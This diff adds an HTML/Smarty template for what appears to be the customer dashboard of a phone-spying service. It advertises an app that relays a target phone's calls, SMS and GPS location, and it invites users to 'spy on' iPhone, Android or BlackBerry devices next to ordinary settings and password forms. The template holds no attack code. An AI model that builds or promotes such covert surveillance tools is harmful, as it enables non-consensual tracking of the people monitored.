@@ -1,0 +1,126 @@
+<style>
+    @media (max-width: 767px) {
+        .mobile-applications .row {
+            text-align: center;
+        }
+        
+        .mobile-applications .row > div {
+            margin-bottom: 8px;
+        }
+        
+        .mobile-applications .pull-left, .mobile-applications .pull-right {
+            float: none !important;
+        }
+    }
+    
+    @media (max-width: 480px) {
+        .hidden-xxs {
+            display: none;
+        }
+        
+        .add-device .pull-left, .add-device .pull-right {
+            float: none !important;
+        }
+        
+        .add-device {
+            text-align: center;
+        }
+    }
+</style>
+
+<h1 class="text-center">{$title}</h1>
+
+<div class="col-lg-12">{$di.flashMessages}</div>
+
+<div class="row-clear">
+    <div class="col-lg-6 col-md-6">
+        <div class="panel panel-default mobile-applications">
+            <div class="panel-heading">Would you like to get info straight to your smartphone?</div>
+            <div class="panel-body">
+                <p>We've launched brand new Control Panel Application for Android and iOS users which allow to get calls, sms, and gps location simply from the app.</p>
+                <h4 style="padding: 20px;" class="text-center text-info">FREE DOWNLOAD NOW!</h4>
+                <div class="row">
+                    <div class="col-md-6">
+                        <a href="https://play.google.com/store/apps/details?id=com.control.panel.app" target="_blank" class="pull-left">
+                            <img src="https://developer.android.com/images/brand/en_generic_rgb_wo_60.png" alt="Get it on Google Play">
+                        </a>
+                    </div>
+                    <div class="col-md-6">
+                        <a href="https://itunes.apple.com/us/app/top-control-panel/id722262265?ls=1&amp;mt=8" target="_blank" class="pull-right">
+                            <img alt="" src="{$di.config.staticDomain}/img/AppStore.png">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="col-lg-6 col-md-6">
+        <div class="panel panel-default add-device">
+            <div class="panel-heading">Add new phone</div>
+            <div class="panel-body">
+                <ul class="add-buttons">
+                    <li>
+                        <span class="hidden-xxs">Do you want to spy on iPhone?</span>
+                        <a href="{$di.router->getRouteUrl('main')}how-to-install/ios-instructions.html" class="btn btn-success pull-right">Add iPhone</a>
+                    </li>
+                    <li>
+                        <span class="hidden-xxs">Do you want to spy on Android?</span>
+                        <a href="{$di.router->getRouteUrl('main')}how-to-install/android-instructions.html" class="btn btn-success pull-right">Add Android</a>
+                    </li>
+                    <li class="last">
+                        <span class="hidden-xxs">Do you want to spy on BlackBerry?</span>
+                        <a href="{$di.router->getRouteUrl('main')}how-to-install/blackberry-instructions.html" class="btn btn-success pull-right">Add BlackBerry</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row-clear">
+    <div class="col-lg-6 col-md-6">
+        <div class="panel panel-default">
+            <div class="panel-heading">Account Settings</div>
+            <div class="panel-body">
+                <form role="form" action="" method="post">
+                    <div class="form-group">
+                        <label>{$di.t->_('Email')}</label>
+                        <input type="text" value="{$authData.login}" class="form-control" disabled />
+                    </div>
+                    <div class="form-group">
+                        <label for="localeList">{$di.t->_('Language')}</label>
+                        {html_options class="form-control" name="locale" id="localeList" options=$di.config.locales selected=$di.locale}
+                    </div>
+                    <div class="form-group">
+                        <label for="recordsList">{$di.t->_('Records per page on table')}</label>
+                        {html_options name="recordsPerPage" id="recordsList" class="form-control" values=$recordsPerPageList output=$recordsPerPageList selected=$recordsPerPage}
+                    </div>
+                    <button type="submit" name="settings" class="btn btn-primary">{$di.t->_('Update')}</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="col-lg-6 col-md-6">
+        <div class="panel panel-default">
+            <div class="panel-heading">Change Password</div>
+            <div class="panel-body">
+                <form role="form" action="" method="post">
+                    <div class="form-group">
+                        <label for="oldPassword">{$di.t->_('Old Password')}</label>
+                        <input type="password" name="oldPassword" id="oldPassword" class="form-control" />
+                    </div>
+                    <div class="form-group">
+                        <label for="newPassword">{$di.t->_('New password')}</label>
+                        <input type="password" name="newPassword" id="newPassword" class="form-control" />
+                    </div>
+                    <div class="form-group">
+                        <label for="newPassword2">{$di.t->_('New password again')}</label>
+                        <input type="password" name="newPassword2" id="newPassword2" class="form-control" />
+                    </div>
+                    <button type="submit" name="changePassword" class="btn btn-primary">{$di.t->_('Update')}</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
